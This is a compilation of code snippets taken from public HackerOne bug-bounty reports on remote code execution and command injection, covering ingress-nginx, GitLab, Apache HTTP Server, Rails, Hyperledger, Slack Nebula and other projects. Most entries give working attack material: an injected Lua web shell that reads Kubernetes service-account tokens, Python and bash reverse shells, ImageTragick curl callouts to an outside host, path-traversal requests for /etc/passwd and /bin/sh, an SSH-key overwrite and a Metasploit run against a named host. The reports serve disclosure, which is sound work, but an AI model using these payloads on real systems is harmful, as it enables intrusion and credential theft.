Source: `hackerone/reports/2022/1401444.md` (https://hackerone.com/reports/1401444)

```
markup(:wikicloth, /mediawiki|wiki/) do |content|
  wikicloth = WikiCloth::WikiCloth.new(:data => content)
  WikiCloth::WikiBuffer::HTMLElement::ESCAPED_TAGS << 'tt'
  wikicloth.to_html(:noedit => true)
end
```

```
begin
  require 'rubyluabridge'
  DISABLE_LUA = false
rescue LoadError
  DISABLE_LUA = true
end
```

```
local oldloadstring = loadstring
local function safeloadstring(s, chunkname)
  local f, message = oldloadstring(s, chunkname)
  if not f then
    return f, message
  end
  setfenv(f, getfenv(2))
  return f
end
```

## #1728174 Ingress nginx annotation injection causes arbitrary command execution — kubernetes — $2,500 — Code Injection
Source: `hackerone/reports/2023/1728174.md` (https://hackerone.com/reports/1728174)

```
cat > su.yml<<EOF
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
spec:
  rules:
  - host: suanve.susec.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80

EOF

kubectl apply -f su.yml
```

```
curl -v -H 'Host: suanve.susec.me' -H "cmd: id" 127.0.0.1/suanve/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET /suanve/ HTTP/1.1
> Host: suanve.susec.me
> User-Agent: curl/7.79.1
> Accept: */*
> cmd: id
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 10 Oct 2022 09:58:18 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
uid=101(www-data) gid=82(www-data) groups=82(www-data)
```

```
GET /suanve/ HTTP/1.1
Host: suanve.susec.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
cmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
Content-Length: 2
```

## #1620702 RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field — kubernetes — $2,500 — Code Injection
Source: `hackerone/reports/2023/1620702.md` (https://hackerone.com/reports/1620702)

```
serverVersion:
  buildDate: "2022-03-06T21:32:53Z"
  compiler: gc
  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
  gitTreeState: clean
  gitVersion: v1.23.4
  goVersion: go1.17.7
  major: "1"
  minor: "23"
  platform: linux/amd64
```

```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.2.1
  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.19.10

-------------------------------------------------------------------------------
```

```
kind: Cluster
name: lab
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
# the control plane node config
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: InitConfiguration
    nodeRegistration:
      kubeletExtraArgs:
        node-labels: "ingress-ready=true"
  extraPortMappings:
  - containerPort: 80
    hostPort: 80
    protocol: TCP
  - containerPort: 443
    hostPort: 443
    protocol: TCP
# the three workers
- role: worker
- role: worker
- role: worker
```

## #2039464 Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation — kubernetes — $2,500 — Code Injection
Source: `hackerone/reports/2023/2039464.md` (https://hackerone.com/reports/2039464)

```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.8.0
  Build:         35f5082ee7f211555aaff431d7c4423c17f8ce9e
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.21.6

-------------------------------------------------------------------------------
```

```
        helm upgrade -i ingress-nginx ingress-nginx/ingress-nginx -f values.yaml # values.yaml is attached
        
```

```
        k apply -f ingress.yaml #ingress.yaml is attached
        
```

## #298873 Command injection by overwriting authorized_keys file through GitLab import — gitlab — $2,000 — Command Injection - Generic
Source: `hackerone/reports/2018/298873.md` (https://hackerone.com/reports/298873)

```
POST /import/gitlab_project HTTP/1.1
Host: gitlab-instance
...

------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="path"
test
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="namespace_id"

1
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="file"; filename="2017-12-17_02-20-093_root_test_export.tar.gz"
Content-Type: application/x-gzip

<file data>
```

```
# This service is an adapter used to for the GitLab Import feature, and
# creating a project from a template.
# The latter will under the hood just import an archive supplied by GitLab.
module Projects
  class GitlabProjectsImportService
    # ...

    def execute
      FileUtils.mkdir_p(File.dirname(import_upload_path))
      FileUtils.copy_entry(file.path, import_upload_path)

      Gitlab::ImportExport::ProjectCreator.new(params[:namespace_id],
                                               current_user,
                                               import_upload_path,
                                               params[:path]).execute
    end

    # ...

    def tmp_filename
      "#{SecureRandom.hex}_#{params[:path]}"
    end
  end
end
```

```
POST /import/gitlab_project HTTP/1.1
Host: gitlab-instance
...

------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="path"

new-test/../../../../../../../../../var/opt/gitlab/.ssh/authorized_keys
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="namespace_id"

1
------WebKitFormBoundaryA0TxBpQRLhL4lJQN
Content-Disposition: form-data; name="file"; filename="2017-12-17_02-20-093_root_test_export.tar.gz"
Content-Type: application/x-gzip

command="ls -lash",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxc6GwCNoYCygtTXvoBpn1ACoF4hxhQviNa/0fm3LGGnEWLszswgw4QcaxXYiRumKjBv77eJT2/VbJylZX0uL6D/1/hubTmnp2A1QQJLk1rMvaUGlR8DeQpIcF1T61g3y4lEw5yhaaHRqRLiMpGammQhu0PO6PTDbKlGH+HxA0u8ku/L+lJXncNtpupw3qTDaAt8dgamKAU8RSZRyANK2BVYVj1W376OQFglHIeQW62LsNNgvr9Oe/Ze1YeQqvHO/lv0AeWYdLgjBJOiC5acBFexDBCr4odeSqkDPmKCMI28Mw28hC8fJIHh3vFqXjvlPtkuhDmdap4x+8gUxP77DWoMGw6LY8cuce+sSWY0teawMFW8Dm2R0Fr2iHzpCT8IpKgVHQ24BnmPGWjtWHxDX2DSzdE3GC6dWStVXud3iprgipM2SOxFkwHIISzLybjT1u/fK1sO4IW6E2T1cgSYQd7I2KhNJsgW57GljefD4cmhlwR39ZXZ1GtDCoUxtwZF3Qpr6XaSQ4nL71Wq+Y+v2TGeJzI9HXHRUSP2gZh/BI5kUdeUKkeylhLLouCqII5MlIlMmklXFOOPXoip/KCO36fYRZ1YAhxJ0J1JGX7ws4BnMMKHAHp+YOtRpAfGXcA+yEdMx50PRvXydqNeivfvDlY2JXRRIKUA03O9GoWmPLpQ==
------WebKitFormBoundaryA0TxBpQRLhL4lJQN--
```

## #402362 RCE due to ImageTragick v2 — pixiv — $2,000 — Code Injection
Source: `hackerone/reports/2021/402362.md` (https://hackerone.com/reports/402362)

```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

## #1705717 POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network.  — hyperledger — $2,000 — Command Injection - Generic
Source: `hackerone/reports/2022/1705717.md` (https://hackerone.com/reports/1705717)

```
def _get_curr_info(cls, package):
    cmd = compose_cmd(['dpkg', '-s', package])
    return cls.run_shell_command(cmd)
```

```
{
    "identifier": "6ouriXMZkLeHsuXrN1X1fd",
    "operation": {
        "action": "start",
        "name": "test",
        "package": "a ; python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"
        172.17 .0 .2\\ ",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\" / bin / sh\\ ")\'",
        "schedule": {
            "4yC546FFzorLPgTNTc6V43DnpFrR8uHvtunBxb2Suaa2": "2022-12-25T10:25:58.271857+00:00",
            "AtDfpKFe1RPgcr5nnYBw1Wxkgyn8Zjyh5MzFoEUTeoV3": "2022-12-25T10:26:16.271857+00:00",
            "DG5M4zFm33Shrhjj6JB7nmx9BoNJUq219UXDfvwBDPe2": "2022-12-25T10:26:25.271857+00:00",
            "JpYerf4CssDrH76z7jyQPJLnZ1vwYgvKbvcp16AB5RQ": "2022-12-25T10:26:07.271857+00:00"
        },
        "sha256": "db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55",
        "type": "109",
        "version": "1.1"
    },
    "protocolVersion": 2,
    "reqId": 1651152851,
    "signature": "4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT"
}
```

```
    cmd = compose_cmd(['dpkg', '-s', package])
    return cls.run_shell_command(cmd)
```

## #473888 RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage) — rails — $1,500 — Command Injection - Generic
Source: `hackerone/reports/2019/473888.md` (https://hackerone.com/reports/473888)

```
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_verifier.rb#L110
    def initialize(secret, options = {})
      raise ArgumentError, "Secret should not be nil." unless secret
      @secret = secret
      @digest = options[:digest] || "SHA1"
      @serializer = options[:serializer] || Marshal
    end
```

```
# https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb#L145
def initialize(secret, *signature_key_or_options)
  options = signature_key_or_options.extract_options!
  sign_secret = signature_key_or_options.first
  @secret = secret
  @sign_secret = sign_secret
  @cipher = options[:cipher] || self.class.default_cipher
  @digest = options[:digest] || "SHA1" unless aead_mode?
  @verifier = resolve_verifier
  @serializer = options[:serializer] || Marshal
end
```

```
# https://github.com/rails/rails/blob/v5.2.2/activestorage/lib/active_storage/engine.rb#L81
initializer "active_storage.verifier" do
  config.after_initialize do |app|
    ActiveStorage.verifier = app.message_verifier("ActiveStorage")
  end
end
```

## #98259 'Limited' RCE in certain places where Liquid is accepted — shopify — $1,500 — Code Injection
Source: `hackerone/reports/2015/98259.md` (https://hackerone.com/reports/98259)

```
    {{ methods | json }}
    {{ systemu }}
    {{ class }}
    {{ to_yaml}}
```

## #519220 File writing by Directory traversal at actionpack-page_caching and RCE by it — rails — $1,000 — Path Traversal
Source: `hackerone/reports/2020/519220.md` (https://hackerone.com/reports/519220)

```
  def cache_file(path, extension)
    if path.empty? || path =~ %r{\A/+\z}
      name = "/index"
    else
      name = URI.parser.unescape(path.chomp("/"))
    end

    if File.extname(name).empty?
      name + (extension || default_extension)
    else
      name
    end
  end

  def cache_path(path, extension = nil)
    File.join(cache_directory, cache_file(path, extension))
  end
```

```
ruby -v

rails -v

rails new caching_traversal

cd caching_traversal

# add `gem "actionpack-page_caching"` in Gemfile

bundle install

rails generate scaffold book name:string
rails db:migrate
```

```
# app/controllers/books_contorller.rb
class BooksController < ApplicationController
  before_action :set_book, only: [:show, :edit, :update, :destroy]

  caches_page :show
```

## #1624172 [███████] Remote Code Execution at ██████ [CVE-2021-44529] [HtUS] — deptofdefense — $1,000 — Code Injection
Source: `hackerone/reports/2023/1624172.md` (https://hackerone.com/reports/1624172)

```
  GET /client/index.php HTTP/1.1
  Host: ███████
  User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
  Connection: close
  Cookie: ab=ab; c=cGhwaW5mbygpOw==; d=; e=;
  Accept-Encoding: gzip, deflate
  
  
  
```

## #1404731 Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50 — ibb — $1,000 — Path Traversal: '.../...//'
Source: `hackerone/reports/2021/1404731.md` (https://hackerone.com/reports/1404731)

```
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

PoC RCE
```

```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
If-None-Match: "2aa6-5cda88e8a6005-gzip"
If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
Connection: close
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M
```

## #1807214 The `io.kubernetes.client.util.generic.dynamic.Dynamics` contains a code execution vulnerability due to SnakeYAML — kubernetes — $1,000 — Code Injection
Source: `hackerone/reports/2023/1807214.md` (https://hackerone.com/reports/1807214)

```
package org.jlleitschuh.sandbox;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class ScriptEngineFactoryRCE implements ScriptEngineFactory {
    static {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("open -a Calculator");
            p.waitFor();
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptE
```

```
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8080/"]]]]
```

```
    static {
        try {
            Runtime r = Runtime.getRuntime();
            Process p = r.exec("open -a Calculator");
            p.waitFor();
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
```

## #106548 Format string vulnerability in zend_throw_or_error() — ibb — $1,000 — Code Injection
Source: `hackerone/reports/2016/106548.md` (https://hackerone.com/reports/106548)

```
<?php $name="%n%n%n"; $name::doSomething(); ?>
```

```
andrew@thinkpad /tmp/php-7.0.0_64 % cat /tmp/test.php
<?php
ini_set("memory_limit", "4G");
$rdx = 0x42424242; // what
$rax = 0x43434343; // where
$name = "%" . ($rdx - 8) . "d" . "%d" . "%n" . str_repeat("A", ($rax - 34));
$name::doSomething();
?>

andrew@thinkpad /tmp/php-7.0.0_64 % gdb sapi/cli/php
GNU gdb (GDB) 7.10
Copyright (C) 2015 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-unknown-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from sapi/cli/php...done.
(gdb) r /tmp/test.php
Starting program: /tmp/php-7.0.0_64/sapi/cli/php /tmp/test64.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000000000672935 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffffa610, is_char=is_char@entry=1 '\001', fmt=<optimized out>, ap=0x7fffffffa658)
	at /tmp/php-7.0.0_64/main/spprintf.c:744
```

```
diff -rup php-7.0.0_old/Zend/zend_execute_API.c php-7.0.0_new/Zend/zend_execute_API.c
--- php-7.0.0_old/Zend/zend_execute_API.c	2015-12-01 07:36:25.000000000 -0600
+++ php-7.0.0_new/Zend/zend_execute_API.c	2015-12-12 12:24:24.999391117 -0600
@@ -218,7 +218,7 @@ static void zend_throw_or_error(int fetc
 	zend_vspprintf(&message, 0, format, va);
 
 	if (fetch_type & ZEND_FETCH_CLASS_EXCEPTION) {
-		zend_throw_error(exception_ce, message);
+		zend_throw_error(exception_ce, "%s", message);
 	} else {
 		zend_error(E_ERROR, "%s", message);
 	}
```

## #784714 Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation — slack — $750 — Command Injection - Generic
Source: `hackerone/reports/2020/784714.md` (https://hackerone.com/reports/784714)

```
#!/bin/bash
bash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &
DEVICE=$1
CIDER=$2
IP=$3
/sbin/ifconfig $1 $2 $3

4. Make the script executable by running `chmod +x /tmp/ifconfig`

5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.

6. On the host in step 1, a reverse Bash shell connects. Run the command "whoami" (or id) and "hostname" and verify the user is now root, and the hostname is the hostname of the MacOS computer in step 2.

Note: To perform this attack on Windows, a custom binary would need to be compiled and named "netsh" but the principles are the same on each OS. 

###Resolution###
Modify the paths on the affected lines to absolute paths. For example, line 45 of nebula/tun_darwin.go reads:
```

```
Modify this snippet to provide an absolute path, as shown below:
```

## #214022 Admin Command Injection via username in user_archive ExportCsvFile — discourse — $512 — Command Injection - Generic
Source: `hackerone/reports/2017/214022.md` (https://hackerone.com/reports/214022)

```
      file_name_prefix = if @entity == "user_archive"
        "#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime("%y%m%d-%H%M%S")}"

      file_name = "#{file_name_prefix}-#{file.id}.csv"
      absolute_path = "#{UserExport.base_directory}/#{file_name}"

      `gzip -5 #{absolute_path}`
```

```
      file_name_prefix = if @entity == "user_archive"
        "#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime("%y%m%d-%H%M%S")}"
```

```
      file_name = "#{file_name_prefix}-#{file.id}.csv"
      absolute_path = "#{UserExport.base_directory}/#{file_name}"
```

## #134321 RCE on facebooksearch.algolia.com — algolia — $500 — Code Injection
Source: `hackerone/reports/2016/134321.md` (https://hackerone.com/reports/134321)

```
     if res && !res.get_cookies.empty?
-      match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
+      match = res.get_cookies.match(/([_A-Za-z0-9\-]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)
     end
```

```
# setting up
use exploit/multi/http/rails_secret_deserialization
set secret "<grab-from-github-url>"
set rhost facebooksearch.algolia.com
set railsversion 4
set targeturi /auth/facebook

# and then run
exploit

# when successful, a reverse shell will be established
# this allows you to run arbitrary commands
```

```
id
uid=1000(prod) gid=1000(prod) groups=1000(prod)
```

## #2221404 RCE on worker host due to unsanitized "env" variable name in task definition on community-tc.services.mozilla.com — mozilla — $500 — Code Injection
Source: `hackerone/reports/2024/2221404.md` (https://hackerone.com/reports/2221404)

```
retries: 0
created: '2023-10-23T08:10:11.044Z'
deadline: '2023-10-23T11:10:11.044Z'
expires: '2024-10-23T11:10:11.044Z'
taskQueueId: proj-misc/tutorial
projectId: none
tags: {}
scopes: []
payload:
  env:
# Commands to run in here
    test2 --help ; whoami ; ls -lah ;: '--help'
  image: ubuntu:latest
  command:
    - /bin/bash
    - '-c'
    - 'echo hello'
  maxRunTime: 5000
extra: {}
metadata:
  name: example-task
  description: An **example** task
  owner: name@example.com
  source: https://community-tc.services.mozilla.com/tasks/create
schedulerId: taskcluster-ui
```

```
    test2 --help ; whoami ; ls -lah ;: '--help'
```

```
    - /bin/bash
    - '-c'
    - 'echo hello'
```

